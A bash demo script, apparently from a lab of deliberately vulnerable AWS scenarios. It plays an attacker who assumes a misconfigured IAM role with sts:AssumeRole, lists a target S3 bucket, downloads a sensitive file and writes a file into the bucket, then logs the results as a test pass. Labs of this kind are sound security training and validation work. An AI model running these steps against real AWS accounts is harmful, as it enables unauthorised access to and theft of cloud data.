#!/bin/bash

# Demo script for sts:AssumeRole to S3 bucket access
# This script demonstrates how a user can assume a role to gain access to a sensitive S3 bucket

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
REGION="us-east-1"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}STS AssumeRole to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Navigate to the Terraform root directory (6 levels up from scenario directory)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"

echo -e "${YELLOW}Step 1: Retrieving credentials from Terraform outputs${NC}"
cd "$TERRAFORM_ROOT"

# Get the grouped module output
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_sts_001_sts_assumerole.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not retrieve module outputs. Make sure the scenario is deployed.${NC}"
    exit 1
fi

# Extract credentials and resource information from grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
BUCKET_ACCESS_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_access_role_arn')
TARGET_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="$REGION"
fi

echo "Retrieved access key for: $STARTING_USER_NAME"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved credentials${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER_NAME"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID and bucket information
echo -e "${YELLOW}Step 3: Getting account ID and bucket information${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"

# We already have the bucket name from Terraform outputs
BUCKET_NAME="$TARGET_BUCKET_NAME"
echo "Target bucket: $BUCKET_NAME"
echo -e "${GREEN}✓ Retrieved account information${NC}\n"

# [EXPLOIT] Step 4: Verify limited permissions before role assumption
echo -e "${YELLOW}Step 4: Testing current permissions (should be limited)${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list S3 buckets..."
show_cmd "Attacker" "aws s3 ls"
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
else
    echo -e "${YELLOW}Warning: May have more permissions than expected${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Assume the bucket access role
echo -e "${YELLOW}Step 5: Assuming role${NC}"
echo "Role ARN: $BUCKET_ACCESS_ROLE_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $BUCKET_ACCESS_ROLE_ARN --role-session-name demo-bucket-access-session --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $BUCKET_ACCESS_ROLE_ARN \
    --role-session-name demo-bucket-access-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

# Verify we're now the role
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

# [EXPLOIT] Step 6: List bucket contents with the assumed role
echo -e "${YELLOW}Step 6: Listing bucket contents${NC}"
echo "Contents of $BUCKET_NAME:"
show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
aws s3 ls s3://$BUCKET_NAME/
echo -e "${GREEN}✓ Successfully listed bucket contents${NC}\n"

# [EXPLOIT] Step 7: Download sensitive data
echo -e "${YELLOW}Step 7: Downloading sensitive data${NC}"
DOWNLOAD_FILE="/tmp/sensitive-data-${ACCOUNT_ID}.txt"
show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE"
aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE

echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
echo -e "${YELLOW}Contents of sensitive file:${NC}"
cat $DOWNLOAD_FILE
echo ""

# [EXPLOIT] Step 8: Test write access to bucket
echo -e "${YELLOW}Step 8: Testing write access to bucket${NC}"
TEST_FILE="/tmp/test-write-${ACCOUNT_ID}.txt"
echo "Test file created during demo attack - $(date)" > $TEST_FILE
show_attack_cmd "Attacker" "aws s3 cp $TEST_FILE s3://$BUCKET_NAME/demo-test-file.txt"
aws s3 cp $TEST_FILE s3://$BUCKET_NAME/demo-test-file.txt
echo -e "${GREEN}✓ Successfully wrote test file to bucket${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER_NAME${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$(basename $BUCKET_ACCESS_ROLE_ARN)${NC}"
echo -e "Step 2: Gained access to ${YELLOW}$BUCKET_NAME${NC}"
echo -e "Step 3: Successfully ${GREEN}read and wrote${NC} sensitive data"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER_NAME → (AssumeRole) → $(basename $BUCKET_ACCESS_ROLE_ARN) → (S3 Access) → $BUCKET_NAME"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo ""
echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
echo ""

# Standardized test results output
echo "TEST_RESULT:prod_one_hop_to_bucket_sts_001_sts_assumerole:SUCCESS"
echo "TEST_DETAILS:prod_one_hop_to_bucket_sts_001_sts_assumerole:Successfully accessed S3 bucket via role assumption"
echo "TEST_METRICS:prod_one_hop_to_bucket_sts_001_sts_assumerole:role_assumed=true,bucket_accessed=true,data_exfiltrated=true"
echo ""

# Cleanup instructions
echo -e "${YELLOW}To clean up temporary files:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
